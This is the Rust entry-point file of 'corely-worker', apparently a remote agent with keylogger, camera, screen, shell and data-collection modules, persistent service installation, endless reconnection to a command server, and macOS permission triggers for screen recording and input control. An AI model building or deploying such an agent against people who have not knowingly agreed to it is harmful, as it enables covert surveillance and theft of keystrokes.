mod camera;
mod connection;
mod data_collection;
mod filesystem;
mod input;
mod installer;
mod keylogger;
mod plugins;
mod screen;
mod session;
mod shell;
mod system;

use clap::Parser;
use std::panic;
use std::path::PathBuf;
use tracing::{error, info, warn, Level};
use tracing_subscriber::FmtSubscriber;

#[derive(Parser, Debug)]
#[command(name = "corely-worker")]
#[command(version, about = "Corely remote worker agent", long_about = None)]
struct Args {
    /// Server WebSocket URL (e.g., ws://localhost:8000/ws/worker)
    #[arg(short, long, required_unless_present_any = ["uninstall", "request_permissions"])]
    server: Option<String>,

    /// Authentication token
    #[arg(short, long, required_unless_present_any = ["uninstall", "request_permissions"])]
    token: Option<String>,

    /// Install as system service and request permissions
    #[arg(long)]
    install: bool,

    /// Completely uninstall the worker from this system
    #[arg(long)]
    uninstall: bool,

    /// Request macOS permissions (Screen Recording, Accessibility)
    #[arg(long)]
    request_permissions: bool,

    /// Path to external tools/plugins directory
    #[arg(long)]
    tools: Option<PathBuf>,

    /// Worker name (defaults to hostname)
    #[arg(short, long)]
    name: Option<String>,

    /// Enable verbose logging
    #[arg(short, long)]
    verbose: bool,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Set up panic hook for resilience - log and continue instead of crashing
    let default_panic = panic::take_hook();
    panic::set_hook(Box::new(move |info| {
        error!("PANIC caught: {:?}", info);
        // Call default panic hook but don't abort - we'll recover
        default_panic(info);
    }));

    let args = Args::parse();

    // Initialize logging
    let level = if args.verbose {
        Level::DEBUG
    } else {
        Level::INFO
    };
    let subscriber = FmtSubscriber::builder().with_max_level(level).finish();
    tracing::subscriber::set_global_default(subscriber)?;

    // Handle uninstall command
    if args.uninstall {
        info!("Uninstalling corely worker...");
        installer::uninstall()?;
        info!("Uninstall complete");
        return Ok(());
    }

    // Handle request-permissions command (macOS)
    if args.request_permissions {
        info!("Requesting system permissions...");
        request_permissions().await?;
        return Ok(());
    }

    // Get required args (safe to unwrap since clap enforces them unless uninstall/request-permissions)
    let server = args.server.expect("server is required");
    let token = args.token.expect("token is required");

    // Handle install command
    if args.install {
        info!("Installing corely worker as system service...");
        installer::install(&server, &token)?;
        info!("Installation complete");
        return Ok(());
    }

    // Get worker name (defaults to hostname)
    let worker_name = args.name.unwrap_or_else(|| {
        hostname::get()
            .map(|h| h.to_string_lossy().to_string())
            .unwrap_or_else(|_| "unknown".to_string())
    });

    info!("Starting corely worker: {}", worker_name);
    info!("Connecting to server: {}", server);

    // On macOS, request permissions at startup (this is when the daemon binary runs)
    #[cfg(target_os = "macos")]
    {
        request_permissions_silent().await;
    }

    // Load plugins if specified
    let plugins = if let Some(tools_path) = args.tools.clone() {
        info!("Loading plugins from: {:?}", tools_path);
        plugins::load_plugins(&tools_path).unwrap_or_else(|e| {
            warn!("Failed to load plugins: {}", e);
            Vec::new()
        })
    } else {
        Vec::new()
    };

    // The connection::run function already has built-in reconnection logic.
    // It loops forever, reconnecting on disconnection.
    // Panics will be caught by the panic hook and logged, but we let them propagate
    // to allow systemd/launchd to restart the service if needed.
    connection::run(&server, &token, &worker_name, plugins).await
}

/// Request macOS permissions by triggering the relevant APIs.
/// This will cause macOS to show permission dialogs.
async fn request_permissions() -> anyhow::Result<()> {
    #[cfg(target_os = "macos")]
    {
        use std::process::Command;

        println!("Requesting Screen Recording permission...");
        // Trigger Screen Recording by attempting a screenshot
        let _ = Command::new("screencapture")
            .args(["-x", "-t", "png", "/tmp/corely_perm_test.png"])
            .output();
        let _ = std::fs::remove_file("/tmp/corely_perm_test.png");
        println!("  → Screen Recording permission requested.");
        println!("     If a dialog appeared, please grant access.");
        println!();

        println!("Requesting Accessibility permission...");
        // Trigger Accessibility by attempting to use input simulation
        // This will show the permission dialog if not already granted
        use enigo::{Enigo, Settings};
        match Enigo::new(&Settings::default()) {
            Ok(_) => {
                println!("  → Accessibility permission requested.");
                println!("     If a dialog appeared, please grant access.");
            }
            Err(e) => {
                println!("  → Accessibility permission required.");
                println!("     Error: {:?}", e);
                println!("     Please grant access in System Settings > Privacy & Security > Accessibility");
            }
        }
        println!();

        println!("If permission dialogs did not appear, please manually grant access:");
        println!("  System Settings > Privacy & Security > Screen Recording");
        println!("  System Settings > Privacy & Security > Accessibility");
        println!();
        println!("After granting permissions, restart the worker.");
    }

    #[cfg(not(target_os = "macos"))]
    {
        println!("Permission request is only needed on macOS.");
        println!("On other platforms, the worker should work without additional permissions.");
    }

    Ok(())
}

/// Silently request permissions at daemon startup on macOS.
/// This triggers permission requests for the actual daemon binary.
#[cfg(target_os = "macos")]
async fn request_permissions_silent() {
    use std::process::Command;

    info!("Checking/requesting macOS permissions for daemon...");

    // Screen Recording - attempt screenshot to trigger permission
    // This is the key fix: the daemon process is requesting the permission
    let screenshot_result = Command::new("screencapture")
        .args(["-x", "-t", "png", "/tmp/corely_daemon_perm_check.png"])
        .output();
    let _ = std::fs::remove_file("/tmp/corely_daemon_perm_check.png");

    match screenshot_result {
        Ok(output) if output.status.success() => {
            info!("Screen Recording permission: granted or dialog shown");
        }
        _ => {
            warn!("Screen Recording permission may be required - check System Settings > Privacy & Security > Screen Recording");
        }
    }

    // Accessibility - attempt to use enigo
    use enigo::{Enigo, Settings};
    match Enigo::new(&Settings::default()) {
        Ok(_) => {
            info!("Accessibility permission: granted");
        }
        Err(e) => {
            warn!("Accessibility permission required: {:?}", e);
            warn!("Grant access in System Settings > Privacy & Security > Accessibility");
        }
    }

    // Input Monitoring for keylogger (CGEventTap)
    // This is triggered when we actually try to use keylogging,
    // but we can log a reminder
    info!("Input Monitoring permission will be requested when keylogging is activated");
}
